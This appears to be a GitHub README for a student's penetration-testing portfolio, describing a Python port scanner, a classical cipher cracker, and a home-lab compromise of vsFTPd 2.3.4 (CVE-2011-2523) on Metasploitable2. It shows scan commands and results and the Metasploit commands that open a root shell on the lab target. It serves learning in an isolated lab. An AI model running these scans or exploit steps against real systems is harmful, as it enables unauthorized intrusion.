# 🔐 CyberScan — Penetration Testing Toolkit

![Python](https://img.shields.io/badge/Python-3.x-blue?style=flat&logo=python)
![Status](https://img.shields.io/badge/Status-Active-brightgreen?style=flat)
![License](https://img.shields.io/badge/License-MIT-green?style=flat)
![Phase](https://img.shields.io/badge/Phase-1%20Complete-00ff88?style=flat)

**Author:** Laurent Mahemba ([@Mahembajr](https://github.com/Mahembajr))  
**Started:** February 17, 2026  
**Goal:** Self-directed cybersecurity learning path → penetration testing career

A growing collection of offensive security tools, home lab exploits, and
CTF writeups — built from scratch to deeply understand how attacks work at
the network and cryptographic level.

---

## 📁 Repository Structure
```
cyberscan/
├── port_scanner.py       ← Multithreaded TCP port scanner with banner grabbing
├── cipher_cracker.py     ← Caesar & Vigenère encrypt / decrypt / crack
├── requirements.txt      ← Standard library only — no dependencies
├── README.md             ← You are here
└── writeups/
    └── CVE-2011-2523.md  ← vsFTPd backdoor exploit — root shell achieved
```

---

## 🛠️ Tool 1 — Python Port Scanner

A multithreaded TCP port scanner with service fingerprinting and banner
grabbing — the same core technique used in professional penetration tests.
Built from scratch using only Python's standard library, no nmap required.

### Features

- Scans up to 65,535 ports using 100 concurrent threads
- Banner grabbing identifies exact software versions on open ports
- Service fingerprinting maps ports to known services (SSH, HTTP, SMB, FTP...)
- Threaded queue architecture — 1,024 ports scanned in ~11 seconds
- Directly maps discovered versions to CVE vulnerabilities

### Usage
```bash
python port_scanner.py <target> <start_port> <end_port>

# Examples
python port_scanner.py 127.0.0.1 1 1024
python port_scanner.py scanme.nmap.org 1 1024
python port_scanner.py 192.168.1.1 1 500
```

### Real Results

**scanme.nmap.org (public test target)**
```
[+] Port  22  OPEN  →  SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13
[+] Port  80  OPEN  →  HTTP/1.1 200 OK
[*] Scan completed in 11.17 seconds
```

**Metasploitable2 home lab (192.168.11.132)**
```
[+] Port  21  OPEN  →  220 (vsFTPd 2.3.4)        ← CVE-2011-2523 BACKDOOR
[+] Port  22  OPEN  →  SSH-2.0-OpenSSH_4.7p1     ← Multiple known CVEs
[+] Port  23  OPEN  →  Telnet (plaintext auth)    ← Critical risk
[+] Port  25  OPEN  →  220 Postfix (Ubuntu)
[+] Port  53  OPEN  →  DNS
[+] Port  80  OPEN  →  HTTP web application
[+] Port 111  OPEN  →  RPC
[+] Port 139  OPEN  →  NetBIOS
[+] Port 445  OPEN  →  SMB
[+] Port 512  OPEN  →  "Where are you?"           ← Unauthenticated RCE
[+] Port 513  OPEN  →  rlogin
[+] Port 514  OPEN  →  rsh
[*] 12 open ports found — Scanned in 2.21 seconds
```

> **Key finding:** Banner grabbing on port 21 revealed vsFTPd 2.3.4 — a version
> with a known backdoor (CVE-2011-2523). This version number directly led to a
> successful root shell exploit documented in
> [writeups/CVE-2011-2523.md](writeups/CVE-2011-2523.md).

---

## 🔐 Tool 2 — Cipher Cracker

Encrypts, decrypts, and automatically cracks Caesar and Vigenère ciphers
with no key required. Implements the Kasiski examination and Index of
Coincidence — the same techniques used to break Vigenère in 1863.

### Features

- Caesar cipher: encrypt, decrypt, brute force all 25 shifts
- Vigenère cipher: encrypt and decrypt with any keyword
- Vigenère cracker: recovers the key and plaintext from ciphertext alone
- English word scoring and letter frequency analysis for auto-detection
- Interactive menu interface

### Usage
```bash
python cipher_cracker.py
```

### Demo — Vigenère cracked with no key
```
[INPUT]   Yc bvv fgtgfxcsiu, hjfi rv mogv...   (key unknown)
[KEY]     CYBER                                  (recovered automatically)
[OUTPUT]  We are discovered, flee at once...     (plaintext recovered)
```

> **Why this matters:** Caesar and Vigenère fail because their key spaces are
> tiny and statistically detectable. This is exactly why AES-256 uses 2^256
> possible keys — making brute force computationally impossible.
> Understanding why classical ciphers fail teaches you what makes modern
> encryption strong.

---

## 🏠 Home Lab — Exploit Environment

### Setup
```
Windows Host
└── VMware Workstation Player
    ├── Kali Linux      192.168.11.131  ← attacker machine
    └── Metasploitable2 192.168.11.132  ← intentionally vulnerable target
```

### CVE-2011-2523 — Root Shell Achieved

Port scanner identified **vsFTPd 2.3.4** on port 21.
Metasploit exploited the backdoor trigger:
```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > set RHOSTS 192.168.11.132
msf6 > run

[*] Banner: 220 (vsFTPd 2.3.4)
[*] Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened
```

**Result: Full root shell. Complete system compromise.**  
Full writeup → [writeups/CVE-2011-2523.md](writeups/CVE-2011-2523.md)

---

## 🧠 Skills Demonstrated

| Area | Skills |
|---|---|
| Network Security | TCP/IP, port scanning, banner grabbing, service fingerprinting |
| Exploitation | CVE research, Metasploit, vulnerability identification from version numbers |
| Cryptography | Classical cipher analysis, frequency analysis, Kasiski examination |
| Python | Multithreading, sockets, queue architecture, CLI tools |
| Lab Setup | VMware, Kali Linux, Metasploitable2, isolated network configuration |

---

## 🗺️ Roadmap

- [x] **Phase 1** — Network tools, cipher cracker, home lab, first root shell
- [ ] **Phase 2** — Web application security (DVWA, Burp Suite, SQLi, XSS)
- [ ] **Phase 3** — TryHackMe CTF writeups, vulnerability scanner
- [ ] **Phase 4** — Malware analysis lab, Ghidra reverse engineering

---

## ⚠️ Legal Notice

All techniques documented here were performed exclusively on systems I own
or have explicit written permission to test. The home lab runs on an isolated
private network with no external connectivity. **Never scan or test systems
without authorization.**

---

*Self-directed cybersecurity learning path. Goal: penetration tester / ethical hacker.*  
*Connect: [LinkedIn](https://www.linkedin.com/in/laurent-mahemba/) · 
[TryHackMe](https://tryhackme.com/p/Mahembajr) · 
[Portfolio](https://mahembajr.github.io)*
